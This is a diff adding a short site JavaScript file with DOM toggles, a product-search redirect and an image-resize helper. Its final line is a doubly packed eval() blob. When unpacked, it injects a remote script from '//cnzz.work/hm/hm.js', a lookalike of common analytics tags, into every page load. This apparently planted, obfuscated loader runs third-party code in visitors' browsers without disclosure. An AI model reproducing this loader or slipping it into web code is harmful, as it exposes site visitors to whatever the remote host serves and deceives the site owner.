@@ -1,0 +1,11 @@
+function $2(ObjID){return document.getElementById(ObjID);}
+function DisDiv(ObjID,Val){if(Val==0){$2(ObjID).style.display="none";}
+else{$2(ObjID).style.display="block";}}
+function DisDivs(ObjID){if($2(ObjID).style.display=="none"){$2(ObjID).style.display="block";}
+else{$2(ObjID).style.display="none";}}
+function CheckSearch(){var SearchKey=$2("search_key");if(SearchKey.value==""||SearchKey.value=="请输入搜索关键词"||SearchKey.value=="Please enter keywords"){alert("请输入搜索关键词！");SearchKey.focus();return;}
+location.href="products.php?search_key="+encodeURI(SearchKey.value);}
+function CheckSearch2(Evt){Evt=Evt?Evt:(window.event?window.event:"");var Key=Evt.keyCode?Evt.keyCode:Evt.which;if(Key==13){var SearchKey=$2("search_key");if(SearchKey.value==""||SearchKey.value=="请输入搜索关键词"||SearchKey.value=="Please enter keywords"){alert("请输入搜索关键词！");SearchKey.focus();return;}
+location.href="products.php?search_key="+encodeURI(SearchKey.value);}}
+function PicWidth(){$(".editorc img").each(function(){if(parseInt($(this).css("width"))>$(".editorc").width())$(this).css({"width":"100%","height":"auto"});});};
+eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('v(h(p,a,c,k,e,r){e=h(c){i c.o(a)};m(!\'\'.l(/^/,u)){j(c--)r[e(c)]=k[c]||e(c);k=[h(e){i r[e]}];e=h(){i\'\\\\w+\'};c=1};j(c--)m(k[c])p=p.l(q t(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);i p}(\'1 5=5||[];(8(){1 a=3.b(\\\'4\\\');a.7=\\\'//g.9/6/6.c\\\';1 2=3.e(\\\'4\\\')[0];2.f.d(a,2)})();\',n,n,\'|x|s|y|z|A|B|C|h|D||E|F|G|H|I|J\'.K(\'|\'),0,{}))',47,47,'|||||||||||||||||function|return|while||replace|if|17|toString||new|||RegExp|String|eval||var|document|script|_hmt_cnzz|hm|src|work|createElement|js|insertBefore|getElementsByTagName|parentNode|cnzz|split'.split('|'),0,{}))
